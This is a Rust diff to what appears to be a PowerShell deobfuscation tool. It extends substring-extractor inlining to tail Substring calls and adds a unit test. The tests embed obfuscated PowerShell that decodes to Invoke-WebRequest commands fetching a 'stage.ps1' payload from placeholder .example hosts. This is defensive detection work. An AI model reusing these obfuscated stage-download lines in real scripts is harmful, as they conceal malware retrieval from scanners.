@@ -1015,6 +1015,14 @@ static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_TAIL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal tail substring extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3363,7 +3371,12 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body) else {
+        let full_substring = PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body);
+        let tail_substring = full_substring
+            .is_none()
+            .then(|| PS_LITERAL_TAIL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body))
+            .flatten();
+        let Some(caps) = full_substring.as_ref().or(tail_substring.as_ref()) else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
@@ -3372,9 +3385,7 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
         let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
             continue;
         };
-        let Some(len_var) = caps.get(3).map(|m| m.as_str()) else {
-            continue;
-        };
+        let len_var = caps.get(3).map(|m| m.as_str());
 
         let param_index = parse_ps_function_param_indices(&params);
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
@@ -3383,8 +3394,12 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
         let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let Some(len_idx) = param_index.get(&len_var.to_ascii_lowercase()).copied() else {
-            continue;
+        let len_idx = match len_var {
+            Some(len_var) => match param_index.get(&len_var.to_ascii_lowercase()).copied() {
+                Some(idx) => Some(idx),
+                None => continue,
+            },
+            None => None,
         };
 
         let binding = PsSubstringExtractorParamBinding {
@@ -3805,44 +3820,56 @@ fn inline_ps_literal_substring_calls(
                 search_from = value_end;
                 continue;
             };
-            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-            let Some((second_end, second_num)) = parse_ps_usize_arg(text, pos) else {
-                search_from = first_end;
-                continue;
+            let (second_num, mut call_end) = if binding.len_idx.is_some() {
+                pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+                let Some((second_end, second_num)) = parse_ps_usize_arg(text, pos) else {
+                    search_from = first_end;
+                    continue;
+                };
+                (Some(second_num), second_end)
+            } else {
+                (None, first_end)
             };
-            let mut call_end = second_end;
             if parenthesized {
                 let after = skip_ascii_ws(bytes, call_end);
                 if bytes.get(after) != Some(&b')') {
-                    search_from = second_end;
+                    search_from = call_end;
                     continue;
                 }
                 call_end = after + 1;
             }
 
-            if binding.value_idx != 0 || binding.start_idx > 2 || binding.len_idx > 2 {
+            if binding.value_idx != 0
+                || binding.start_idx > 2
+                || binding.len_idx.is_some_and(|idx| idx > 2)
+            {
                 search_from = call_end;
                 continue;
             }
             let start = match (binding.start_idx, binding.len_idx) {
-                (1, 2) => first_num,
-                (2, 1) => second_num,
+                (1, None | Some(2)) => first_num,
+                (2, Some(1)) => second_num.unwrap_or(0),
                 _ => {
                     search_from = call_end;
                     continue;
                 }
             };
-            let len = match (binding.start_idx, binding.len_idx) {
-                (1, 2) => second_num,
-                (2, 1) => first_num,
-                _ => {
+            let end = if binding.len_idx.is_some() {
+                let len = match (binding.start_idx, binding.len_idx) {
+                    (1, Some(2)) => second_num.unwrap_or(0),
+                    (2, Some(1)) => first_num,
+                    _ => {
+                        search_from = call_end;
+                        continue;
+                    }
+                };
+                let Some(end) = start.checked_add(len) else {
                     search_from = call_end;
                     continue;
-                }
-            };
-            let Some(end) = start.checked_add(len) else {
-                search_from = call_end;
-                continue;
+                };
+                end
+            } else {
+                value.len()
             };
             if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
                 search_from = call_end;
@@ -3921,8 +3948,8 @@ struct PsSubstringExtractorParamBinding<'a> {
     value_name: &'a str,
     start_idx: usize,
     start_name: &'a str,
-    len_idx: usize,
-    len_name: &'a str,
+    len_idx: Option<usize>,
+    len_name: Option<&'a str>,
 }
 
 fn inline_ps_named_literal_substring_call(
@@ -3931,7 +3958,7 @@ fn inline_ps_named_literal_substring_call(
     parenthesized: bool,
     value_name: &str,
     start_name: &str,
-    len_name: &str,
+    len_name: Option<&str>,
 ) -> Option<(usize, String)> {
     let (call_end, args) =
         parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
@@ -3945,15 +3972,19 @@ fn inline_ps_named_literal_substring_call(
         .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
         .1
         .as_usize()?;
-    let len = args
-        .iter()
-        .find(|(name, _)| name.eq_ignore_ascii_case(len_name))?
-        .1
-        .as_usize()?;
     if value.len() > 8192 {
         return None;
     }
-    let end = start.checked_add(len)?;
+    let end = if let Some(len_name) = len_name {
+        let len = args
+            .iter()
+            .find(|(name, _)| name.eq_ignore_ascii_case(len_name))?
+            .1
+            .as_usize()?;
+        start.checked_add(len)?
+    } else {
+        value.len()
+    };
     if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
         return None;
     }
@@ -7510,6 +7541,27 @@ Pick 'zz{decoded}yy' 2 {len}"#,
                 "'Invoke-WebRequest -Uri https://ps-paren-substring-extractor.example/stage.ps1'"
             ),
             "parenthesized-receiver substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_tail_substring_extractor_call_is_rewritten() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
+        let text = format!(
+            r#"function Tail($value,$start) {{
+  return $value.Substring($start)
+}}
+Tail 'zz{decoded}' 2"#
+        );
+
+        let out = expand_literal_substring_extractor_calls(&text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1'"
+            ),
+            "tail substring extractor call was not rewritten:\n{out}"
         );
     }
 
